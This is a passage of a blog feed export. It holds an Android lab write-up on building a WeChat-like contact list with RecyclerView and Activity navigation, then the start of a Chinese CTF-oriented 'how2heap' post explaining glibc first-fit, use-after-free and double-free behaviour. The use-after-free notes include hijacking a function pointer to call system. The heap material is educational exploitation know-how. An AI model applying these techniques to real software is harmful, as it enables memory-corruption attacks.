class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.058"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.388"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/textDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"152dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"3"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"微信昵称"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.0"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.275"</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>设置了一些基础信息</p><h3 id="2-核心代码实现"><a href="#2-核心代码实现" class="headerlink" title="2-核心代码实现"></a>2. 核心代码实现</h3><h4 id="2-1-在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter"><a href="#2-1-在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter" class="headerlink" title="2-1-在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter"></a>2.1 在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter</h4><p><strong>代码</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResult;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultCallback;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultLauncher;<br><span class="hljs-keyword">import</span> androidx.activity.result.contract.ActivityResultContracts;<br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.ItemTouchHelper;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">txlFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {<br>    <span class="hljs-comment">//获取recyclerView对象并且实例化适配器</span><br>    <span class="hljs-keyword">private</span> RecyclerView recyclerView;<br>    <span class="hljs-keyword">private</span> MyAdapter myAdapter;<br>    LinearLayout linearLayout;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                             Bundle savedInstanceState)</span> {<br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-comment">//return inflater.inflate(R.layout.fra_lx, container, false);</span><br>        View view;<br>        <span class="hljs-comment">//存所有控件的视图</span><br>        view=inflater.inflate(R.layout.item, container, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//调用recycleview控件</span><br>        recyclerView=view.findViewById(R.id.itemview);<br>        linearLayout=view.findViewById(R.id.linearLayout_txl);<br>        <span class="hljs-comment">//创建数据</span><br>        String[] names={<span class="hljs-string">"Pappy"</span>,<span class="hljs-string">"Mommy"</span>,<span class="hljs-string">"Sister"</span>,<span class="hljs-string">"Little Sister"</span>,<span class="hljs-string">"Brother"</span>,<span class="hljs-string">"Little Brother"</span>,<span class="hljs-string">"Roommate"</span>};<br>        <span class="hljs-type">int</span>[] images={R.drawable.baba,R.drawable.mama,R.drawable.jiejie,R.drawable.meimei,R.drawable.gege,<br>                R.drawable.didi,R.drawable.shiyou1};<br>        String[] phones={<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<br>                <span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>};<br>        String[] regions={<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"湖北 武汉"</span>};<br>        String[] tags={<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"同学"</span>};<br>        List&lt;Map&lt;String,Object&gt;&gt; items=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Map&lt;String,Object&gt;&gt;();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;names.length;i++){<br>            Map&lt;String,Object&gt; item=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>            item.put(<span class="hljs-string">"i_name"</span>,names[i]);<br>            item.put(<span class="hljs-string">"i_image"</span>,images[i]);<br>            item.put(<span class="hljs-string">"i_phone"</span>,phones[i]);<br>            item.put(<span class="hljs-string">"i_region"</span>,regions[i]);<br>            item.put(<span class="hljs-string">"i_tag"</span>,tags[i]);<br>            items.add(item);<br>        }<br>        <span class="hljs-comment">//创建RecycleView实例和设置Adapter</span><br>        Context context=getContext();<br>        myAdapter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAdapter</span>(items,context);<br>        LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>        manager.setOrientation(recyclerView.VERTICAL);<br>        recyclerView.setLayoutManager(manager);<br>        recyclerView.setAdapter(myAdapter);<br>        <span class="hljs-keyword">return</span> view;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-Myadapater-实现跳转操作"><a href="#2-2-Myadapater-实现跳转操作" class="headerlink" title="2-2-Myadapater-实现跳转操作"></a>2.2 Myadapater 实现跳转操作</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResult;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultCallback;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultLauncher;<br><span class="hljs-keyword">import</span> androidx.activity.result.contract.ActivityResultContracts;<br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter &lt;MyAdapter.MyViewHolder&gt;{<br>    <span class="hljs-comment">//定义存储数据和运行环境的变量</span><br>    <span class="hljs-keyword">private</span> List&lt;Map&lt;String,Object&gt;&gt; mydata;<br>    <span class="hljs-keyword">private</span> Context mycontext;<br><br>    <span class="hljs-comment">//获取数据和运行环境</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAdapter</span><span class="hljs-params">(List&lt;Map&lt;String,Object&gt;&gt; data, Context context)</span>{<br>        mydata=data;<br>        mycontext=context;<br>    }<br><br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MyViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {<br>        View view= LayoutInflater.from(mycontext).inflate(R.layout.fragment_txl,parent,<span class="hljs-literal">false</span>);<br>        MyViewHolder holder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyViewHolder</span>(view);<br>        <span class="hljs-keyword">return</span> holder;<br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> MyAdapter.MyViewHolder holder, <span class="hljs-type">int</span> position)</span> {<br>        String name=mydata.get(position).get(<span class="hljs-string">"i_name"</span>).toString();<br>        <span class="hljs-type">int</span> image=Integer.parseInt(mydata.get(position).get(<span class="hljs-string">"i_image"</span>).toString());<br>        <span class="hljs-comment">//获取详情页面中某个联系人的对应数据</span><br>        String phone=mydata.get(position).get(<span class="hljs-string">"i_phone"</span>).toString();<br>        String region=mydata.get(position).get(<span class="hljs-string">"i_region"</span>).toString();<br>        String tag=mydata.get(position).get(<span class="hljs-string">"i_tag"</span>).toString();<br>        holder.textView.setText(name);<br>        holder.imageView.setImageResource(image);<br><br>        <span class="hljs-comment">//添加点击事件</span><br>        holder.linearLayout_txl.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> {<br>                <span class="hljs-comment">//点击后跳转到联系人详情页</span><br>                Intent intent=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(mycontext, txlDetails.class);<br><br>                <span class="hljs-comment">//使用bundle传值</span><br>                <span class="hljs-type">Bundle</span> <span class="hljs-variable">bundle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bundle</span>();<br>                bundle.putString(<span class="hljs-string">"details"</span>,name);<br>                bundle.putInt(<span class="hljs-string">"image"</span>, image);<br>                bundle.putString(<span class="hljs-string">"phone"</span>,phone);<br>                bundle.putString(<span class="hljs-string">"region"</span>,region);<br>                bundle.putString(<span class="hljs-string">"tag"</span>,tag);<br><br>                intent.putExtras(bundle);<br>                mycontext.startActivity(intent);<br>            }<br>        });<br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getItemCount</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">return</span> mydata.size();<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewHolder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.ViewHolder {<br>        <span class="hljs-keyword">public</span> LinearLayout linearLayout_txl;<br>        <span class="hljs-keyword">private</span> TextView textView;<br>        <span class="hljs-keyword">private</span> ImageView imageView;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View itemView)</span> {<br>            <span class="hljs-built_in">super</span>(itemView);<br>            <span class="hljs-comment">//获取item中的控件id</span><br>            textView=itemView.findViewById(R.id.text_duihuakuang);<br>            imageView=itemView.findViewById(R.id.image_touxiang);<br>            linearLayout_txl=itemView.findViewById(R.id.linearLayout_txl);<br>        }<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>跳转的实现主要是对于LinearLayout_txl 的点击动作实现一个监听，具体操作 Intent intent=new Intent(mycontext, txlDetails.class) <code>myContext</code>是一个代表当前Activity的上下文对象。<code>txlDetails.class</code>是目标Activity的类名。然后将数据压缩绑定到bundle里面，添加到intent，最后调用startActivity(intent) 进行跳转</p><h4 id="2-3-txlDetails"><a href="#2-3-txlDetails" class="headerlink" title="2-3-txlDetails"></a>2.3 txlDetails</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">txlDetails</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {<br>    TextView dName,textView1,textView2,textView3;<br>    ImageView dImage;<br>    Button button_r;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_txl_details);<br>        <span class="hljs-comment">//获取上一个Actvity传过来的intent</span><br>        Intent intent=getIntent();<br>        dName=findViewById(R.id.textDetail);<br>        dImage=findViewById((R.id.imageDetail));<br>        <span class="hljs-comment">//根据intent获取得到的数据设置item控件的值</span><br>        dImage.setImageResource(intent.getIntExtra(<span class="hljs-string">"image"</span>,R.drawable.find));<br>        dName.setText(intent.getStringExtra(<span class="hljs-string">"details"</span>));<br>        textView1=findViewById(R.id.phone);<br>        textView2=findViewById(R.id.region2);<br>        textView3=findViewById(R.id.wxtag2);<br>        textView1.setText(intent.getStringExtra(<span class="hljs-string">"phone"</span>));<br>        textView2.setText(intent.getStringExtra(<span class="hljs-string">"region"</span>));<br>        textView3.setText(intent.getStringExtra(<span class="hljs-string">"tag"</span>));<br>        button_r=findViewById(R.id.returnButton);<br>        button_r.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>                Log.d(<span class="hljs-string">"fb"</span>,<span class="hljs-string">"button_r...."</span>);<br>                <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>                setResult(<span class="hljs-number">777</span>,intent);<br>                finish();<br>            }<br>        });<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>用于接受来自txlFragment传过来的数据并显示数据，设置了返回button用于返回至跳转前的Activity</p><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p class='item-img' data-src='https://s2.loli.net/2023/11/07/cpBYQLotO1PwNRC.gif'><img src="https://s2.loli.net/2023/11/07/cpBYQLotO1PwNRC.gif" alt="3.gif"></p><h2 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h2><p><a href="https://github.com/Kylinxin/MyWork">https://github.com/Kylinxin/MyWork</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​本次实现我完成了RecyclerView的实现，明白了如何对recyclerView进行传参，设置每一项的具体样子。同时对Activity跳转有了更清晰的认识，startActivity(intent);通过intent设置了跳转对象，进行跳转，这种方法简单直观，但是没办法处理返回值，老版本的解决方法是采用方法startActivityForResult()进行解决，但是有许多弊端和RequestCode难以处理，新版本中采用了registerForActivityResult()方法通过在使用<code>registerForActivityResult()</code>方法注册ActivityResultContracts.StartActivityForResult时，处理启动Activity并获取返回结果的逻辑。ActivityResultCallback<activityresult>是一个接口，用于处理<code>ActivityResultLauncher</code>的结果回调。当启动的Activity结束并返回结果时，回调方法中的<code>ActivityResult</code>参数将包含返回的结果信息。总的来说思路非常清晰，但是我也发现了一个问题，那就是在myadater中无法使用这种方式进行跳转，后来查找原因，registerForActivityResult()只能在fragment或activity中才能使用。这次收获满满，加深了我对recyclerView的使用和activity间跳转的用法和差异。</activityresult></p><p>—— 2023.11.7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;AS类微信界面开发&lt;/h1&gt;
&lt;h2 id=&quot;功能要求&quot;&gt;&lt;a href=&quot;#功能要求&quot; class=&quot;headerlink&quot; title=&quot;功能要求&quot;&gt;&lt;/a&gt;功能要求&lt;/h2&gt;
&lt;p&gt;1、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；&lt;/</summary>
      
    
    
    
    <category term="实验" scheme="https://kylinxin.github.io/categories/%E5%AE%9E%E9%AA%8C/"/>
    
    
    <category term="移动开发实验" scheme="https://kylinxin.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>how2heap漏洞和解析</title>
    <link href="https://kylinxin.github.io/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/"/>
    <id>https://kylinxin.github.io/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/</id>
    <published>2023-10-31T15:14:29.000Z</published>
    <updated>2023-10-31T08:05:32.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="First-fit"><a href="#First-fit" class="headerlink" title="First-fit"></a>First fit</h2><p><strong>原理</strong></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">演示glibc 的分配机制<br>glibc 使用首次适应算法选择空闲的堆块<br>如果有一个空闲堆块且足够大，那么 <span class="hljs-keyword">malloc</span> 将选择它<br>如果存在 use-after-<span class="hljs-keyword">free</span> 的情况那可以利用这一特性<br>首先申请两个比较大的 chunk<br>第一个 a <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x512</span>) 在: <span class="hljs-number">0x1682010</span><br>第二个 b <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x256</span>) 在: <span class="hljs-number">0x1682530</span><br>我们可以继续分配它<br>现在我们把 <span class="hljs-string">"AAAAAAAA"</span> 这个字符串写到 a 那里 <br>第一次申请的 <span class="hljs-number">0x1682010</span> 指向 AAAAAAAA<br>接下来 <span class="hljs-keyword">free</span> 掉第一个...<br>接下来只要我们申请一块小于 <span class="hljs-number">0x512</span> 的 chunk，那就会分配到原本 a 那里: <span class="hljs-number">0x1682010</span><br>第三次 <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x500</span>) 在: <span class="hljs-number">0x1682010</span><br>我们这次往里写一串 <span class="hljs-string">"CCCCCCCC"</span> 到刚申请的 <span class="hljs-keyword">c</span> 中<br>第三次申请的 <span class="hljs-keyword">c</span> <span class="hljs-number">0x1682010</span> 指向 CCCCCCCC<br>第一次申请的 a <span class="hljs-number">0x1682010</span> 指向 CCCCCCCC<br>可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 <span class="hljs-string">"CCCCCCCC"</span><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>存在uaf，首先释放一个堆块p1，里面有内容</li><li>再申请一个相同大小的堆块p2</li><li>这两个堆块实际上指向同一个内存区域</li></ul><p><strong>结果</strong></p><p>这两个堆块实际上指向同一个内存区域</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p><strong>原理</strong></p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">申请<span class="hljs-number">0x20</span>大小的内存<span class="hljs-built_in">p1</span> 的地址: <span class="hljs-number">0x1f11010</span><br>把<span class="hljs-built_in">p1</span>[<span class="hljs-number">1</span>]赋值为Printf函数，然后打印出<span class="hljs-string">"Hello CTFshow"</span><br><span class="hljs-symbol">Hello</span> CTFshow<br><br><span class="hljs-symbol">free</span> 掉 <span class="hljs-built_in">p1</span><br>因为并没有置为null，所以<span class="hljs-built_in">p1</span>[<span class="hljs-number">1</span>]仍然是Printf函数，仍然可以输出打印了<span class="hljs-string">"Hello CTFshow again"</span><br><span class="hljs-symbol">Hello</span> CTFshow again<br>接下来再去malloc一个<span class="hljs-built_in">p2</span>，会把释放掉的<span class="hljs-built_in">p1</span>给分配出来，可以看到他俩是同一地址的<br><span class="hljs-symbol">p2</span> 的地址: <span class="hljs-number">0x1f11010</span><br><span class="hljs-symbol">p1</span> 的地址: <span class="hljs-number">0x1f11010</span><br>然后把<span class="hljs-built_in">p2</span>[<span class="hljs-number">1</span>]给改成demoflag也就是system函数<br><br><span class="hljs-symbol">Then</span> <span class="hljs-meta">get</span> the flag &amp;&amp; enjoy <span class="hljs-keyword">it</span> !<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>free掉chunk1</li><li>再申请一个相同大小的chunk2，修改内容</li><li>再使用chunk1，会输出修改内容</li></ul><p><strong>结果</strong></p><p>chunk1和chunk2是同一个chunk</p><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double-Free"></a>Double Free</h2><p><strong>原理</strong></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span 